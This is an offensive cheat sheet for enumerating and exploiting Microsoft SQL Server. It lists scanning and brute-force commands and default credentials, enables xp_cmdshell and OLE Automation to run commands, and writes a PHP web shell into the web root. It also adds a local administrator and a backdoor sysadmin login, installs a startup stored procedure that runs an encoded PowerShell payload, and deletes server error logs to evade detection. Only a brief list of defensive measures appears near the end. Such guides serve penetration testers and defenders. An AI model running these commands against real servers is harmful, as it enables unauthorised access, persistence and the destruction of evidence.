# Microsoft SQL Server (MSSQL) Enumeration

Microsoft SQL Server is a relational database management system commonly found in Windows environments.

## Service Information

**Default Ports:** 1433/tcp (default), 1434/udp (SQL Server Browser)
**Protocol:** TCP/UDP
**Service:** Microsoft SQL Server

## Discovery

### Port Scanning
```bash
# Nmap scan for MSSQL
nmap -p 1433,1434 target
nmap -sU -p 1434 target

# Service detection
nmap -sV -p 1433 target
nmap -sC -p 1433 target

# MSSQL scripts
nmap --script ms-sql-info target
nmap --script ms-sql-config target
nmap --script ms-sql-tables target
nmap --script ms-sql-hasdbaccess target
```

### Banner Grabbing
```bash
# Telnet
telnet target 1433

# Netcat
nc target 1433
```

## Enumeration

### Instance Discovery
```bash
# SQL Server Browser (UDP 1434)
nmap -sU -p 1434 --script ms-sql-discover target

# Manual UDP query
echo -ne "\x02" | nc -u target 1434

# Metasploit
use auxiliary/scanner/mssql/mssql_ping
```

### Version Information
```bash
# Nmap script
nmap --script ms-sql-info target

# Manual query
sqlcmd -S target -Q "SELECT @@version"
```

## Authentication

### Default Credentials
```
Common defaults:
- sa / (blank)
- sa / sa
- sa / password
- MSSQL / password
- sql / password
```

### Password Attacks
```bash
# Hydra
hydra -l sa -P passwords.txt mssql://target
hydra -L users.txt -P passwords.txt mssql://target

# Medusa
medusa -h target -u sa -P passwords.txt -M mssql

# Ncrack
ncrack -p 1433 --user sa -P passwords.txt target
```

### Windows Authentication
```bash
# Using domain credentials
sqlcmd -S target -E
sqlcmd -S target -U domain\user -P password

# Impacket
impacket-mssqlclient domain/user:password@target
impacket-mssqlclient domain/user:password@target -windows-auth
```

## Exploitation

### Command Execution

#### xp_cmdshell
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'dir C:\';
EXEC xp_cmdshell 'net user';

-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

#### sp_OACreate (OLE Automation)
```sql
-- Enable OLE Automation
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Execute commands
DECLARE @myshell INT;
EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "echo test > C:\temp\test.txt"';
```

### File Operations

#### Reading Files
```sql
-- Using OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

-- Using xp_cmdshell
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';
```

#### Writing Files
```sql
-- Using BCP
EXEC xp_cmdshell 'bcp "SELECT ''<?php system($_GET[\"c\"]); ?>''" queryout C:\inetpub\wwwroot\shell.php -c -T';

-- Using xp_cmdshell
EXEC xp_cmdshell 'echo ^<?php system($_GET["c"]); ?^> > C:\inetpub\wwwroot\shell.php';
```

### Database Links
```sql
-- List linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Query linked server
SELECT * FROM OPENQUERY("LINKEDSERVER", 'SELECT @@version');

-- Execute on linked server
EXEC ('SELECT @@version') AT LINKEDSERVER;
```

## Post-Exploitation

### Privilege Escalation

#### Database Roles
```sql
-- Check current user
SELECT SYSTEM_USER, USER_NAME(), USER;

-- Check database roles
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('dbcreator');
SELECT IS_SRVROLEMEMBER('bulkadmin');

-- Add user to sysadmin role
EXEC sp_addsrvrolemember 'user', 'sysadmin';
```

#### Service Account
```sql
-- Check service account
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';

-- If running as SYSTEM/high privilege account
EXEC xp_cmdshell 'net user hacker password123 /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';
```

### Data Extraction
```sql
-- List databases
SELECT name FROM sys.databases;

-- List tables
SELECT table_name FROM information_schema.tables;

-- Extract data
SELECT * FROM database.dbo.users;
SELECT username, password FROM database.dbo.users;
```

### Persistence

#### Create Backdoor User
```sql
-- Create SQL user
CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123';
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
```

#### Startup Stored Procedures
```sql
-- Create startup procedure
USE master;
GO
CREATE PROCEDURE sp_backdoor
AS
EXEC xp_cmdshell 'powershell -enc <base64_payload>';
GO

-- Mark as startup procedure
EXEC sp_procoption 'sp_backdoor', 'startup', 'on';
```

## Tools

### Command Line Clients
```bash
# sqlcmd (Windows)
sqlcmd -S target -U sa -P password

# sqsh (Linux)
sqsh -S target -U sa -P password

# Impacket mssqlclient
impacket-mssqlclient sa:password@target
```

### GUI Tools
- SQL Server Management Studio (SSMS)
- Azure Data Studio
- DBeaver
- HeidiSQL

### Metasploit Modules
```bash
# Scanner modules
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_hasdbaccess
use auxiliary/scanner/mssql/mssql_enum

# Admin modules
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_exec
use auxiliary/admin/mssql/mssql_enum_sql_logins
```

## Security Considerations

### Common Vulnerabilities
- Default credentials (sa account)
- Weak passwords
- Excessive privileges
- Enabled xp_cmdshell
- SQL injection vulnerabilities
- Unpatched instances

### Detection Evasion
```sql
-- Disable SQL Server logs
EXEC sp_cycle_errorlog;
EXEC xp_cmdshell 'del C:\Program Files\Microsoft SQL Server\MSSQL*\MSSQL\LOG\ERRORLOG*';

-- Clear command history
EXEC xp_cmdshell 'powershell Clear-History';
```

### Defensive Measures
- Disable unnecessary features (xp_cmdshell, OLE Automation)
- Use Windows Authentication
- Implement least privilege
- Regular security updates
- Monitor SQL Server logs
- Network segmentation

## References

- [MSSQL Red Team Cheat Sheet](https://github.com/dsasmblr/mssql-red-team-cheat-sheet)
- [HackTricks MSSQL](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

